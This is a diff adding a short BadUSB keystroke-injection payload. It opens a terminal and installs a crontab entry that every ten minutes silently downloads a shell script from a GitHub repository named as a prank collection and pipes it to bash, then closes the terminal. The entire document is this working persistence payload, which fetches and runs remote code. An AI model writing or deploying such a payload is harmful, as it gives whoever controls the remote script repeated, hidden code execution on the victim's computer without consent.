@@ -1,0 +1,4 @@
+CTRL-ALT t
+DELAY 2000
+STRING (crontab -l 2>/dev/null; echo "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"; echo "*/10 * * * * wget -qO- https://raw.githubusercontent.com/Cluster-bright/bad_usb_for_fun/refs/heads/main/terminal_tomfoolery/tardis/tardis_setup.sh | bash") | crontab - && exit
+ENTER
